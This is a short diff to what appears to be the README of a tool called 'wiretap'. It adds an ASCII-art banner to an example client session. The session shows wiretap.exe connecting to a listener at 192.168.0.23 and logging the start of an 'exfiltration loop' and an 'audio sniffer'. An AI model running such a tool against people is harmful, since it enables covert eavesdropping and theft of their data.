@@ -33,6 +33,11 @@ We can connnect to our example listener server by using the command below. `--ve
 ### Client Example
 ```
 PS C:\> .\wiretap.exe --server 192.168.0.23 --port 5353 --verbose
+        _         _
+__ __ _(_)_ _ ___| |_ __ _ _ __
+\ V  V / | '_/ -_)  _/ _` | '_ \
+ \_/\_/|_|_| \___|\__\__,_| .__/
+                          |_|
 [INFO] connected to listener: 192.168.0.23:5353
 [INFO] started exfiltration loop
 [INFO] started audio sniffer
